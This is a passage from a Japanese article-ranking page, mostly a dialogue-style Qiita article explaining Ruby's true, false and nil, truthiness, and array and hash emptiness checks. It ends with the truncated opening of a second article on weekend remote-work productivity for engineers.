そう考えると、まず値に関しては、Rubyでは全部クラスであって、型ではない。ここで言う『型ではない』という言葉は、<code>int n = 20</code> の <code>int</code> に相当するものがない、という意味です。後で説明するけど、Rubyという言語の仕様における型が、値には存在します。 <br>
次に変数に関して言うと、Rubyは変数には型が付いていない。クラスも付いていない。『動的変数』という言葉の意味がこれです。 なので、じつは <code>int</code> とか <code>new Int</code> とか書かなくてもいい。というか、書いちゃいけない。</p>

<p>K：サンプルコードを作ってみます。 </p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="n">int</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">20</span>
<span class="nb">p</span> <span class="n">n</span><span class="err"> </span>
</pre></div></div>

<p>これ、確かに実行できないですね。 <code>undefined method ‘int' for main:Object (NoMethodError)</code> となります。 <br>
こう書けないのは動的変数であることを明示的にするためですか？</p>

<p>S：わざわざ複雑に書かなくていいじゃないですか。むしろなんで書きたいの？って感じ。</p>

<p>K：例えば、この変数には数値だけが入っているということを明示したいとかです。明示すると、数値が入っているはずの変数に文字列を入れてしまって結果バグるという未来を回避できると思います。</p>

<p>S：そうですね。それは一面で正しいけれども、Rubyの場合は今はそうなっていない。未来的にはこの変数には数値だけが入っているということを保証できるようになるかもしれないけれど、それでもプログラマが明示的に型を書くという形にはならないと思います。</p>

<p>K：それはなぜですか？</p>

<p>S：JavaScriptやSwiftでもそうだけれど、今は型を書かないのが流行しています。それはなぜかというと、 <code>n=20</code> と書いてあれば、nが整数なのは明らか。後からそれに文字列を入れようとするとエラーになって欲しいんだけど、今はその機能を実現するためにわざわざ型を書かなくても良くなったんです。なぜなら、代入が最初にあった時点で、右辺を見て勝手に判断できるようになったからですね。<br>
 実はRubyにはまだこの機能はないのだけれど、今後そうなっていくのだと思います。</p>

<p>K：なるほど。では、今のところRubyは動的変数を用いていて、型がない言語である、という訳ですね。Rubyは型がない、とはよく聞いていましたが、ようやくその意味がわかった気がします。</p>

<p>S：でも注意して欲しいのは、実際には『変数に』型がないだけであって、『値には』型がある。例えば20っていうのは数値だけれど、これを文字列として扱います、ということにはならない。</p>

<p>K：<code>print(20)</code> は動かなくて、 <code>print(20.string)</code> にしないとダメだということですか？</p>

<p>S：いや、 <code>print(20)</code> は実は変換されちゃうな。 </p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="nb">print</span><span class="p">(</span><span class="mi">20</span> <span class="o">+</span> <span class="s2">"30"</span><span class="p">)</span><span class="err"> </span>
<span class="nb">print</span><span class="p">(</span><span class="s2">"20"</span> <span class="o">+</span> <span class="s2">"30"</span><span class="p">)</span><span class="err"> </span>
</pre></div></div>

<p>にすると、上は動かなくて下は動く、という話です。</p>

<p>K：納得しました。<br>
 ちなみに、 <code>print(20)</code> が普通に20と表示されるのはなんでなんでしょう？</p>

<p>S：printはなんでも引き取って文字列っぽく表示するすごい関数で、数値を引き取っても勝手に文字列にしてくれるからですね。本当に文字列しか表示しない関数は、実はない。</p>

<p>K：ふむふむ。ちゃんと言語の仕様と関数の仕様を分けて考えないと混乱しますね。 <br>
さて、ここでboolean型がないことに話を戻して考えてみると、押さえておくべきことは、値には型がある、変数には型がない、ということですね。<br>
 とすると、trueという値とfalseという値はあるけれど、変数にbooleanという属性のようなものはつけられない、ということで、boolean型がない、ということの意味になりますか？</p>

<p>S：そういうことになります。</p>

<h2>
<span id="booleanクラスも存在しない" class="fragment"></span><a href="#boolean%E3%82%AF%E3%83%A9%E3%82%B9%E3%82%82%E5%AD%98%E5%9C%A8%E3%81%97%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a>Booleanクラスも存在しない</h2>

<p>K：ではここで、trueという値とfalseという値、これらとtrueクラスとfalseクラスについて訊いていきたいと思います。 <br>
まず、trueクラスがあり、falseクラスがあり、そうするとBooleanクラスに入れるものがないので、Booleanクラスは存在しない、という話を聞いたのですが、とするとBooleanは型もクラスも存在しないということなんでしょうか？</p>

<p>S：はい。</p>

<p>K：例えば、Booleanというクラスがあってtrueクラスとfalseクラスはそれを継承している、という話でもない？</p>

<p>S：でもないです。その理由はあって、継承というのは親があって子がある、親クラスの振る舞いと子クラスの振る舞いは共通しているから子クラスで親クラスの挙動をちょっとだけ変えて使う、というのが継承の基礎になります。 <br>
けれども、trueとfalseは正反対の性質なので、同じ挙動ではない。なので、trueとfalseの共通の親は用意していないんです。</p>

<p>K：そうなんですね。なんかコンパイルすると真偽値になるクラスがあったとして、そのクラスのパラメータを一つ変えるだけでtrueとしての振る舞いと、falseとしての振る舞いを切り替えられるのかなぁ？と漠然と思ってましたが、全くそんなことはないのですね。</p>

<p>S：全くそんなことはないです。</p>

<p>K：とすると、trueクラスとfalseクラスさえ用意すれば、Booleanクラスはいらない、という話が納得できてきました。</p>

<h2>
<span id="trueクラスとfalseクラスについて" class="fragment"></span><a href="#true%E3%82%AF%E3%83%A9%E3%82%B9%E3%81%A8false%E3%82%AF%E3%83%A9%E3%82%B9%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6"><i class="fa fa-link"></i></a>trueクラスとfalseクラスについて</h2>

<p>K：ではここまでの話を踏まえて、trueクラスとtrueという型の値、falseクラスとfalseという型の値の関係性について訊いていきたいと思います。 <br>
まず、trueという型の値は、trueクラスのインスタンス、という理解でいいでしょうか？</p>

<p>S：いいでしょうか？の答えは、ハイです。true型の値、ということと、trueクラスのインスタンス、ということは同じことを別の言葉で言っているだけのこと。</p>

<p>K：またちょっと脱線しますが、trueのインスタンスは一つのプログラムで複数存在することはありますか？</p>

<p>S：ないです。</p>

<p>K：とすると、<code>true.object_id</code>は全て同一なんですね。これはfalseに関してもそうですか？</p>

<p>S：そうですね。</p>

<p>K：そうすると、<code>true == true</code>と<code>false == false</code>は常にtrueになるんですね。ここは当たり前だけど、ものすごく大切なところですね。<br>
 そして、trueはtrue、falseはfalseだと、定義・実装しているから、そう動くと。<br>
 ここでこれらの振る舞いについて注意しておいたほうがいいことはありますか？例えば、変数にfalseを代入したはずなのにtrueと判断されてしまう、とか。</p>

<p>S：それはあまりない気がしますね。</p>

<h1>
<span id="ゼロを真にした話" class="fragment"></span><a href="#%E3%82%BC%E3%83%AD%E3%82%92%E7%9C%9F%E3%81%AB%E3%81%97%E3%81%9F%E8%A9%B1"><i class="fa fa-link"></i></a>ゼロを真にした話</h1>

<p>K：ゼロって、例えばCなどではfalseと判断され、そのことを前提としたアルゴリズムもあったりすると思うのですが、Rubyではここがtrueなのは何故なのでしょうか？</p>

<p>S：そもそもCには、歴史上最初にはfalseが無かったのです。今はありますが。なので無いなら何か他のものを代わりに使わなければならない、そのためにゼロが使われていたんです。</p>

<p>K：はー、そんな歴史があったのですね。</p>

<p>S：でも、Rubyには最初からfalseがあるので、無理してゼロのことをfalseだと思わなくていいのです。 <br>
もうちょっと一般的な話をすると、世の中のプログラミング言語というのはだいたいifの条件文の中に何が書けるのかということが何パターンかあります。ひとつは真の値trueと偽の値falseしか書けず、他の値は何らかの方法でtrueかfalseに変換するという言語。もうひとつは偽になる値、例えばゼロ、以外は全部真になるという言語。だいたいこの二つのどちらかです。</p>

<p>K：Rubyは後者だと考えていいですか？</p>

<p>S：だいたいそうなんだけど、Rubyにはnilがあって特殊だね、とは思います。</p>

<h1>
<span id="nilクラスについての話" class="fragment"></span><a href="#nil%E3%82%AF%E3%83%A9%E3%82%B9%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6%E3%81%AE%E8%A9%B1"><i class="fa fa-link"></i></a>nilクラスについての話</h1>

<p>K：では、nilクラスについて聞きたいと思います。まず、 <code>nil == true</code> はfalseですよね？</p>

<p>S：はい。</p>

<p>K：nilをfalseにするのは、言語仕様としてそう決めているわけですよね？</p>

<p>S：混乱してきましたね。用語の整理をしたいです。 <br>
まず、falseというのはfalseクラスのインスタンス、ということにしましょう。次に、if文の中に書いたときにelseの方に行くという現象、これはfalseとは別の名前で呼びたいので、日本語の『偽』という言葉を使いましょう。<br>
 そうすると、nilは偽です。</p>

<p>K：<code>nil == false</code> はtrueでは無い、ということですか？</p>

<p>S：はい。試してみましょう。<br>
 irbで次のように打ってください。 </p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="kp">nil</span> <span class="o">==</span> <span class="kp">false</span><span class="err"> </span>
</pre></div></div>

<p>これは実行されると、 <code>=&gt; false</code> になるはずです。</p>

<p>K：おお、本当だ！では、nilとは何なのでしょう？</p>

<p>S：nilというのは、例えば変数がまだ初期化されていないなど後から何かが入ってくるけどとりあえず場所だけある、つまり、『何も無いという印』のことです。 <br>
なので、本当はtrueとfalseとnilで三分岐するif文を考えることもできたかもしれません。でもそれはややこしいので今は普通に二分岐するif文ができていて、thenの側とelseの側と、どちらにnilを分岐させるか考えたときにelseの側に行ってくれたほうが便利、という理由で『偽』になっています。</p>

<p>K：なるほど。if文の中に書いたときに『偽』にはなるけれど、falseとは別の役割があるから、 <code>nil == false</code> はfalseになるのですね。 <br>
そうすると、nilは一つのプログラムの中で複数インスタンスがあるのでしょうか？</p>

<p>S：それについてはtrueとfalseと同じように、インスタンスは一つです。</p>

<p>K：配列の中などに複数のnilを入れることもできますが、それでもインスタンスは一つなのでしょうか？先程聞いたように何も無い場所を指し示しているのであれば、インスタンスは複数あっていい気がします。</p>

<p>S：それでも一つです。 <br>
例えば、 <code>x="hoge"</code> という式があります。これは、 <code>x</code> という変数の箱の中に <code>"hoge"</code> というオブジェクトが入っているのかというと、Rubyの場合実は違うわけです。<code>n</code>という変数の箱の中には <code>"hoge"</code> というオブジェクトを指し示すメモリアドレスが入っています。</p>

<p>K：Rubyは全部ポインタ！という話ですね。</p>

<p>S：そうです。ここで、<code>y</code>という変数だけ用意したいと考えたとき、それが難しい。なので、 <code>y=nil</code> と書いて <code>y</code> という変数があり、それが <code>nil</code> というオブジェクトを指し示していることを、 <code>y</code> という変数だけ用意した、という意味として考えよう、という工夫をしたのです。 <br>
なので、 <code>y=nil</code> でも <code>z=nil</code> でも、右辺の <code>nil</code> は同じオブジェクトが指し示されているだけなのです。</p>

<p>K：だからnilもインスタンスは一つだけなんですね。 <br>
そして、nilは『偽』として振る舞ったほうが便利だからif文に入れたときに『偽』になるけれども、その本来の役割は空き地を表すことであって、falseであるということとはまた違う、という理解でいいでしょうか？</p>

<p>S：そうです。</p>

<h1>
<span id="配列やハッシュがnilだったり空だったりするときの話" class="fragment"></span><a href="#%E9%85%8D%E5%88%97%E3%82%84%E3%83%8F%E3%83%83%E3%82%B7%E3%83%A5%E3%81%8Cnil%E3%81%A0%E3%81%A3%E3%81%9F%E3%82%8A%E7%A9%BA%E3%81%A0%E3%81%A3%E3%81%9F%E3%82%8A%E3%81%99%E3%82%8B%E3%81%A8%E3%81%8D%E3%81%AE%E8%A9%B1"><i class="fa fa-link"></i></a>配列やハッシュがnilだったり空だったりするときの話</h1>

<p>K：では、配列やハッシュがnilを指し示していたときの話です。これらがtrueとなるのは以下のコードで確認できます。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="n">a</span> <span class="o">=</span> <span class="o">[</span><span class="kp">nil</span><span class="o">]</span><span class="err"> </span>
<span class="k">if</span> <span class="n">a</span> <span class="k">then</span><span class="err"> </span>
    <span class="nb">p</span> <span class="s2">"true"</span><span class="err"> </span>
<span class="k">end</span><span class="err"> </span>
</pre></div></div>

<p>これは <code>"true"</code> を出力します。<br>
 しかし一方で、 </p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="n">a</span> <span class="o">=</span> <span class="o">[</span><span class="kp">nil</span><span class="o">]</span>
<span class="err"> </span><span class="n">a</span> <span class="o">==</span> <span class="kp">true</span><span class="err"> </span>
</pre></div></div>

<p>は、 <code>false</code> となります。 <br>
この振る舞いの差はどうして生まれるのでしょう？</p>

<p>S：ここでもやはり用語を整理しましょう。trueクラスのインスタンスのことをtrueと呼びましょう。<br>
 一方、if文の中に入れたときにthenの側に来ることを、日本語で『真』と呼ぶこととしましょう。</p>

<p>K：先ほどの例に習うと、 <code>a = [nil]</code> は『真』ではあるけれどもtrueでは無い、ということで、後者の比較式はfalseになるのですね。</p>

<p>S：そうですね。 nilが『偽』になったときと同じような議論です。</p>

<p>K：では、先程nilは『偽』として扱うという話になったのに、配列から指し示した途端に『真』の側に行ってしまうようになったのは何故なのでしょうか？</p>

<p>S：それは、配列が『真』だからです。<br>
 真偽を判定するときに、配列の中まで見に行って配列の中身で真偽が変わるということはありません。</p>

<p>K：それはハッシュでも同じなんですね。ただの変数のときだけは、中身を見に行ってnilを『偽』だと判定すると。</p>

<p>S：そうです。変数と配列が同じようにポインタを使っているというのは鋭い着眼点ですね。</p>

<p>K：さらに、配列の中身を見に行かないということは、空配列であっても、『真』と判断してしまうということでしょうか？</p>

<p>S：はい。</p>

<p>K：けれども配列やハッシュが空であるときを真偽値に絡めて判定したいという需要は確実にあります。それを行う関数として、 <code>.empty?</code> があるのですね。<br>
この <code>.empty?</code> の挙動についてまとめたいです。 <br>
まず、次のコードで実験です。 </p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="n">a</span> <span class="o">=</span> <span class="o">[]</span><span class="err"> </span>
<span class="n">a</span><span class="o">.</span><span class="n">empty?</span><span class="err"> </span>
</pre></div></div>

<p>これは <code>true</code> になります。<br>
 一方、</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="n">b</span> <span class="o">=</span> <span class="o">[</span><span class="kp">nil</span><span class="o">]</span><span class="err"> </span>
<span class="n">b</span><span class="o">.</span><span class="n">empty?</span><span class="err"> </span>
</pre></div></div>

<p>これは <code>false</code> です。 <br>
配列aが空配列であるということと、配列bの先頭が空き地を表すという意味を持っていること、この二つが <code>.empty?</code> という関数で違う値を返す理由は何故ですか？</p>

<p>S：これは難しいですね。難しいけど、配列の場合はemptyというのは中身がどうという話ではなく、サイズがゼロかどうかというふうに決めました。それだけが理由です。 <br>
でも、中身まで見てnilしか無いかどうかを確認したい、という需要も確かにあります。そのための関数はすでにあって、 <code>.compact</code> というものがあります。この関数を配列に対して実行すると、nil以外のものを残します。<br>
 この <code>.compact</code> を使った結果、空配列になったのならば、その配列の中にはnilしかなかったということになります。</p>

<p>K：つまり、  </p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="n">b</span> <span class="o">=</span> <span class="o">[</span><span class="kp">nil</span><span class="o">]</span><span class="err"> </span>
<span class="n">b</span><span class="o">.</span><span class="n">compact</span><span class="o">.</span><span class="n">empty?</span><span class="err"> </span>
</pre></div></div>

<p>とやれば、 <code>true</code> が返ってくるということですね。 うまく使い分けたいところです。 <br>
ところで、 <code>.compact</code> はハッシュに対しては定義されていないようですがこの場合はどうすればいいでしょうか？</p>

<p>S：<code>.delete_if{}</code> がありますので、それを使えば似たようなことできます。けれども、あまり一般的では無いかもしれません。ハッシュに対してはニーズがあまり無いのかも。</p>

<blockquote>
<p>注：@watson1978 氏からご指摘がありました。<br>
Ruby 2.4.0からハッシュに対しても<code>.compact</code>が実装されています。<br>
<a href="https://github.com/ruby/ruby/blob/v2_4_0/NEWS" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/ruby/ruby/blob/v2_4_0/NEWS</a><br>
調べが足りていなかったことをお詫びするとともに、訂正をさせていただきます。</p>
</blockquote>

<h1>
<span id="配列やハッシュにtrueやfalseを入れたときの話" class="fragment"></span><a href="#%E9%85%8D%E5%88%97%E3%82%84%E3%83%8F%E3%83%83%E3%82%B7%E3%83%A5%E3%81%ABtrue%E3%82%84false%E3%82%92%E5%85%A5%E3%82%8C%E3%81%9F%E3%81%A8%E3%81%8D%E3%81%AE%E8%A9%B1"><i class="fa fa-link"></i></a>配列やハッシュにtrueやfalseを入れたときの話</h1>

<p>K：では、配列やハッシュにtrueやfalseを入れた場合ですが </p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="n">a</span> <span class="o">=</span> <span class="o">[</span><span class="kp">false</span><span class="o">]</span><span class="err"> </span>
<span class="k">if</span> <span class="n">a</span> <span class="k">then</span><span class="err"> </span>
    <span class="nb">p</span> <span class="s2">"true"</span><span class="err"> </span>
<span class="k">else</span><span class="err"> </span>
    <span class="nb">p</span> <span class="s2">"false"</span><span class="err"> </span>
<span class="k">end</span><span class="err"> </span>
</pre></div></div>

<p>これは <code>"true"</code> を返します。これも先程と同じ結論でしょうか？つまり、配列やハッシュにtrueやfalseを入れても、中身まで見にはいかないから『真』だと判断されると。</p>

<p>S：その通りです。</p>

<p>K：ちなみに、以下のコードだとちゃんと配列の中を覗きに行くから配列に入れた真偽値が反映されるんですね。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="n">a</span> <span class="o">=</span> <span class="o">[</span><span class="kp">false</span><span class="o">]</span><span class="err"> </span>
<span class="k">if</span> <span class="n">a</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="k">then</span><span class="err"> </span>
    <span class="nb">p</span> <span class="s2">"true"</span><span class="err"> </span>
<span class="k">else</span><span class="err"> </span>
    <span class="nb">p</span> <span class="s2">"false"</span><span class="err"> </span>
<span class="k">end</span>    <span class="c1"># =&gt; "false"</span>
</pre></div></div>

<p>S：そうですね。</p>

<p>K：多少脱線しますが、ハッシュのキーにtrueやfalseを入れるのは大丈夫なんでしょうか？</p>

<p>S：やってみればわかりますよ。</p>

<p>K：やってみます。 </p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="n">a</span> <span class="o">=</span> <span class="p">{</span><span class="kp">true</span> <span class="o">=&gt;</span> <span class="s2">"hello"</span><span class="p">,</span> <span class="kp">false</span> <span class="o">=&gt;</span> <span class="s2">"bye"</span><span class="p">}</span>
<span class="err"> </span><span class="nb">p</span> <span class="n">a</span><span class="o">[</span><span class="kp">true</span><span class="o">]</span>                  <span class="c1"># =&gt; "hello"</span>
<span class="nb">p</span> <span class="n">a</span><span class="o">.</span><span class="n">key</span><span class="p">(</span><span class="s2">"hello"</span><span class="p">)</span>           <span class="c1"># =&gt; true </span>
<span class="k">if</span> <span class="n">a</span><span class="o">.</span><span class="n">key</span><span class="p">(</span><span class="s2">"hello"</span><span class="p">)</span> <span class="k">then</span><span class="err"> </span>
    <span class="nb">p</span> <span class="s2">"true"</span><span class="err"> </span>
<span class="k">end</span>                        <span class="c1"># =&gt; "true" </span>
</pre></div></div>

<p>大丈夫ですね。trueやfalseは予約語なので使えないかと思ってました。</p>

<p>S：実際には使えますね。</p>

<h1>
<span id="自作クラスの真偽の話" class="fragment"></span><a href="#%E8%87%AA%E4%BD%9C%E3%82%AF%E3%83%A9%E3%82%B9%E3%81%AE%E7%9C%9F%E5%81%BD%E3%81%AE%E8%A9%B1"><i class="fa fa-link"></i></a>自作クラスの真偽の話</h1>

<p>K：あとは自作クラスについて聞きたいのですが、例えば、次のようなコードはどうでしょう？</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">BoolTest</span><span class="err"> </span>
<span class="k">end</span><span class="err"> </span>

<span class="nb">test</span> <span class="o">=</span> <span class="no">BoolTest</span><span class="o">.</span><span class="n">new</span><span class="err"> </span>

<span class="k">if</span> <span class="nb">test</span> <span class="k">then</span><span class="err"> </span>
    <span class="nb">p</span> <span class="s2">"true"</span><span class="err"> </span>
<span class="k">else</span><span class="err"> </span>
    <span class="nb">p</span> <span class="s2">"false"</span><span class="err"> </span>
<span class="k">end</span><span class="err"> </span>
</pre></div></div>

<p>これは <code>"true"</code> が出てきます。</p>

<p>S：そうですね。</p>

<p>K：これもまた配列の時と同様に、クラスのガワだけを見て中身は気にしない、そしてクラスは『真』だと定義されているから、という理由で良いのでしょうか？</p>

<p>S：はい、その理解ですごく正しいと思います。</p>

<p>K：例えばコンストラクタを作っていないなどの理由でnewだけしてもクラスの中身が何も無いという場合も、そのままifの条件文の中に入れたらtrueになりますね。<br>
 ここで、classの中身に何かがあるか、何もないことを判定するにはどうしたら良いのでしょうか？</p>

<p>S：結論だけ言うと、そういうことは気にしないように作るのがRubyのやり方です。</p>

<p>K：とすると、適当にクラスを作っても <code>.empty?</code> みたいなメソッドは無いということになるのでしょうか？</p>

<p>S：そもそもそのメソッドが必要とされるシーンはどういったシーンですか？</p>

<p>K：例えば、車を買おうとするときに欲しい車がまだ見つかっていないなら <code>wanted_car = Car.new</code> として、見つかったら <code>wanted_car = prius</code> などとするようにしておいて、wanted_carが見つかっているか見つかっていないか調べたい場合です。ここでpriusはCarクラスのインスタンスだと思ってください。</p>

<p>S：そういうことに使うならクラス自体に <code>.empty?</code> が必要そうですね。 <br>
けれども、そのようなメソッドはクラスに対しては用意されていません。なので、それが必要なら自分で実装するようにしてください。</p>

<h1>
<span id="結論条件文には真偽値だけ書けるようにしておけばよかったんだよ" class="fragment"></span><a href="#%E7%B5%90%E8%AB%96%E6%9D%A1%E4%BB%B6%E6%96%87%E3%81%AB%E3%81%AF%E7%9C%9F%E5%81%BD%E5%80%A4%E3%81%A0%E3%81%91%E6%9B%B8%E3%81%91%E3%82%8B%E3%82%88%E3%81%86%E3%81%AB%E3%81%97%E3%81%A6%E3%81%8A%E3%81%91%E3%81%B0%E3%82%88%E3%81%8B%E3%81%A3%E3%81%9F%E3%82%93%E3%81%A0%E3%82%88"><i class="fa fa-link"></i></a>結論：条件文には真偽値だけ書けるようにしておけばよかったんだよ！</h1>

<p>K：ここまでさまざまなtrueとfalseの話をしてきました。RubyにはそもそもBooleanというクラスも型も無い、という衝撃的な話から、trueであることと『真』であることが違う、falseと『偽』についても同様という話など、大変参考になりました。 <br>
でも、これらは結構ややこしいなぁ、というのが正直な感想です。昌平さんはどうですか？</p>

<p>S：つまりですね、ifの条件文には真偽値だけ書けるようにしておけばよかったんですね。</p>

<p>K：なるほど。配列やクラスなどが直接ifの条件文の中に置けるからややこしくなる、という話ですね。<br>
 でも、もしもこれを今から是正するとなると、Rubyで書かれた既存のコードとの互換性を確保するのが相当難しいですね。</p>

<p>S：既存のコードとの互換性はなくなりますね。このifの条件文に置けるものを変えると、既存のコードは一切動かなくなる。<br>
だから、このややこしさを解消するためだけにifの条件文に置けるものを変える、ということは無いでしょう。</p>

<p>K：それもそうですね。<br>
 このややこしさを覚えておくために押さえるべきところは、以下の点で良いでしょうか？</p>

<ol>
<li>trueクラスのインスタンスがtrueという値</li>
<li>falseクラスのインスタンスがfalseという値</li>
<li>trueという値でもfalseという値でも無いが、ほとんどのオブジェクトはその中身に関係なく『真』だと判断される。</li>
<li>ただし、nilオブジェクト、及び変数の中身のnilは『偽』と判断される。</li>
</ol>

<p>S：はい、いいと思います。足りないところも無いです。</p>

<p>K：ありがとうございます。</p>

<h1>
<span id="あとがき" class="fragment"></span><a href="#%E3%81%82%E3%81%A8%E3%81%8C%E3%81%8D"><i class="fa fa-link"></i></a>あとがき</h1>

<p>　お楽しみいただけたでしょうか？<br>
　この本を作るにあたって昌平にいろいろ質問をしたのですが、こちらがどう思っているのかを的確に察しながら答えを返してくれたことに感謝しています。<br>
　この本を作るためにいろいろ質問して理解したことのうち、『真』であることとtrueが違う、『偽』とfalseについても同様、という話が個人的に一番衝撃的だったかもしれません。『真』であることはtrue、『偽』であることはfalseと頭っから覚え込んでいたので、ここが違うとわかった時、頭の靄が晴れるような思いをしました。この本で質問した多くのことは、値がtrueであることと『真』の分岐に向かうこと、値がfalseであることと『偽』の分岐に向かうこと、この両者をごちゃ混ぜに考えているから生まれたもののように思います。<br>
　ここがはっきりしたのが私個人にとっては大きな収穫ですし、読者の方も同じような収穫をこの本の中から得てくれていたとしたら、それに勝る喜びはありません。</p>

<h1>
<span id="謝辞" class="fragment"></span><a href="#%E8%AC%9D%E8%BE%9E"><i class="fa fa-link"></i></a>謝辞</h1>

<p>　この本のレビューをしてくださいました、<a href="/tatsuoSakurai" class="user-mention js-hovercard" title="tatsuoSakurai" data-hovercard-target-type="user" data-hovercard-target-name="tatsuoSakurai">@tatsuoSakurai</a>氏に感謝します。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">29位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>326</kbd>
		<a target="_blank" href="https://qiita.com/Akira-Isegawa/items/ab7d6b5db65dc830bb62">週末在宅ワークの生産性を上げる5つの視点と31の工夫</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-11-08<br />21:35:20</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/199506.html">Akira-Isegawa</a>(7件の記事)<br />(minmeeting 所属)<br><img width="80" height="80" src="https://avatars2.githubusercontent.com/u/996049?v=4">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[アジャイル]</b> <b>[効率化]</b> <b>[マネジメント]</b> <b>[エンジニア]</b> <b>[働き方改革]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>こんにちは。「10分で生産的なミーティングを」できるようにすることを目指して、<a href="https://www.facebook.com/minmeeting/" rel="nofollow noopener" target="_blank">minmeeting</a>というWeb会議ツールを開発している伊勢川です。</p>

<p><a title="Facebook page - minmeeting" href="https://www.facebook.com/minmeeting/" rel="nofollow noopener" target="_blank"><img width="100px" src="https://camo.qiitausercontent.com/e523fdf612ace59e58dad4aefcda2340f75c1ba9/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139393530362f33326536353537372d613562622d326333622d346433302d3436393063336335636530662e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/199506/32e65577-a5bb-2c3b-4d30-4690c3c5ce0f.png"></a></p>

<p><a href="https://www.facebook.com/minmeeting/" rel="nofollow noopener" target="_blank">minmeeting</a>はすべて在宅ワークで開発を進めてきました。その開発の中で、いろいろ試行錯誤をしながら、在宅でもそれなりの生産性が維持できるようになってきました。</p>

<p>そこで、今回は<b>ITエンジニアが週末在宅ワークをする際に、生産性を上げるための工夫</b>を、<b>5つの観点</b>から整理してそれぞれ紹介していきます。</p>

<p><b>※毎日ちょっとずつ工夫を追加していく予定ですので、今後もぜひご期待ください。</b></p>

<h1>
<span id="時間の使い方をコントロールする" class="fragment"></span><a href="#%E6%99%82%E9%96%93%E3%81%AE%E4%BD%BF%E3%81%84%E6%96%B9%E3%82%92%E3%82%B3%E3%83%B3%E3%83%88%E3%83%AD%E3%83%BC%E3%83%AB%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>時間の使い方をコントロールする</h1>

<p><b>週末在宅ワークの鍵</b>となるのが、<b>いかに時間を確保するのか</b>ということです。ここでは、その時間の確保のための工夫を紹介します。</p>

<h2>
<span id="週に20時間以上を確保する" class="fragment"></span><a href="#%E9%80%B1%E3%81%AB20%E6%99%82%E9%96%93%E4%BB%A5%E4%B8%8A%E3%82%92%E7%A2%BA%E4%BF%9D%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>週に20時間以上を確保する</h2>

<p>少し古いITエンジニアの勉強時間の時間の調査<sup id="fnref1"><a href="#fn1" rel="footnote" title="IT技術者の約半数は週の学習時間が3時間未満～「情報に対する意欲」を考える">1</a></sup>によると、大半が週に3時間未満というデータがありますが、プログラミング能力を競うサイトの調査<sup id="fnref2"><a href="#fn2" rel="footnote" title="ITエンジニアの勉強時間は月20時間以上！？好きなことして生きる方法">2</a></sup>では、11%の人が週20時間以上勉強や個人の開発に費やしているようです。</p>

<p>個人的な経験からしても、<b>週に20時間というのは程よい時間</b>で、少し頑張れば確保できるレベルです。<b>平日は2時間、土曜に10時間</b>を確保すれば、日曜は空けることができます。</p>

<p>まずは、週20時間の確保を目指しましょう。</p>

<h2>
<span id="無駄な時間をリストアップしてひとつずつなくしていく" class="fragment"></span><a href="#%E7%84%A1%E9%A7%84%E3%81%AA%E6%99%82%E9%96%93%E3%82%92%E3%83%AA%E3%82%B9%E3%83%88%E3%82%A2%E3%83%83%E3%83%97%E3%81%97%E3%81%A6%E3%81%B2%E3%81%A8%E3%81%A4%E3%81%9A%E3%81%A4%E3%81%AA%E3%81%8F%E3%81%97%E3%81%A6%E3%81%84%E3%81%8F"><i class="fa fa-link"></i></a>無駄な時間をリストアップして、ひとつずつなくしていく</h2>

<p>時間確保のためには、他のことをしていた時間を削らなければなりません。自分の<b>生活の中で、無駄なもの、なくしてもよいものをリストアップして、ひとつずつなくしていきましょう</b>。</p>

<p>NHKの国民生活時間調査<sup id="fnref3"><a href="#fn3" rel="footnote" title="国民生活時間調査　2015">3</a></sup>によると、20代〜30代の人は平日2時間以上<b>テレビと趣味・娯楽のためのインターネット（SNS・ゲームなど）</b>に費やしており、それを<b>やめるだけで、平日2時間は確保</b>できるようです。また、40代以上の人は平日2時間以上をテレビに費やしているため、テレビを捨てるだけで平日の時間は確保できるようです。その他、通勤・通学時間の平均は往復で1時間19分で、会社の近所に引っ越せば、さらに1時間くらい確保できます。</p>

<p>土日はテレビ・趣味・娯楽のためのインターネットの平均時間は4時間半くらいのため、土日両方のテレビ・インターネットの時間を削れば、9時間確保できます。また、雑誌・新聞・漫画・趣味の読書の時間が平均38分くらい、家事の時間が3時間くらいのため、それらを土日合わせて7分の1だけ短縮すれば目標の10時間に到達できます。</p>

<p>上記はあくまで一般的な平均で考えた場合ですが、自分の生活を見直して、<b>削れるものを削っていけば</b>、十分週に<b>20時間は確保できる</b>でしょう。</p>

<h2>
